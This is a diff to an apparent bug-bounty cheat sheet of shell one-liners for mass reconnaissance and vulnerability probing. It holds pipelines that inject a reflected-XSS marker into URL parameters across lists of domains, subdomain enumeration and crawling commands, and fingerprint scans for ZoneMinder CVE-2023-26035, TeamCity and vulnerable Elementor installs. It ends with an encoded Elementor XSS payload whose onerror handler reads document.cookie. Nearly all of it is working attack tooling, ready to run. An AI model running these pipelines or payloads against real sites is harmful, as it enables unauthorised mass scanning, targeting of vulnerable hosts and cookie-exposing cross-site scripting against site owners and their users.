@@ -23,7 +23,7 @@
     #Note: have a server ? use:
     cat domains.txt | gau --providers wayback,commoncrawl,otx,urlscan --mt text/html,application/xhtml+xml,application/xml,application/xml+html,application/vnd.wap.xhtml+xml,application/xhtml+xml,text/xml --subs --fp | uro | grep -E 'https?://[^?]+\?[a-zA-Z0-9_]+=[^&]+(&[a-zA-Z0-9_]+=[^&]+)*' | qsreplace %22%3E%3Ch1%3EAkira%3C%2Fh1%3E | httpx -ms "<h1>Akira</h1>" -ct -t 200 -o bounty.txt
    
-   ### oneLine:
+## one-Line:
     cat Domains.txt | gau | gf xss | sed "s/=.*/=/" | sed "s/URL: //" | uro | httpx -o domain4xss.txt
 
     cat params.js [.py|.go|paramspider.py] | uro --filter hasparams -b jpg png js json pdf txt -o 4xss.txt
@@ -32,7 +32,7 @@
     amass enum -passive -d <DOMAIN> -dir amass_passive/<DOMAIN>/
     assetfinder <DOMAIN> | tee ./subdomains/assetfinder.txt
 
-## web crawlling
+## web crawling
     for i in $(cat hosts-urls.txt); do katana -u $i >> ./katana_rzlts.txt; done
     cat hosts-urls.txt | hakrawler -timeout 5 -subs | tee ./hakrawler_rzlts.txt
     cat hosts-live.txt | gau --threads 15 | tee ./gau_rzlts.txt
@@ -52,6 +52,10 @@
     
 ## zoneminder_RCE CVE-2023-26035
     cat alldomains.txt | httpx -path "/index.php" -ms "__csrf_magic" -t 200 -o CVE-2023-26035.txt
+
+## teamcity
+    cat alldomains.txt | httpx -path "/login.html" -ms "log in to teamcity" -o teamcity.txt
+
 ## Elementor Xss
     cat subs.txt | httpx -path "wp-content/plugins/elementor/readme.txt" -mr "(?i)Stable tag: (3\.[0-5]\.[0-5]\d*)" -o elementor.txt -t 200
     www.target.com/#elementor-action:action=lightbox&settings=ewogICAgInR5cGUiOiAidmlkZW8iLAogICAgInVybCI6ICJodHRwOi8vIiwKICAgICJ2aWRlb1R5cGUiOiAiaG9zdGVkIiwKICAgICJ2aWRlb1BhcmFtcyI6IHsKICAgICAgICAib25lcnJvciI6ImFsZXJ0KGRvY3VtZW50LmRvbWFpbisnICcrZG9jdW1lbnQuY29va2llKSIsCiAgICAgICAgInN0eWxlIjogImJhY2tncm91bmQtY29sb3I6cmVkIgogICAgfQp9
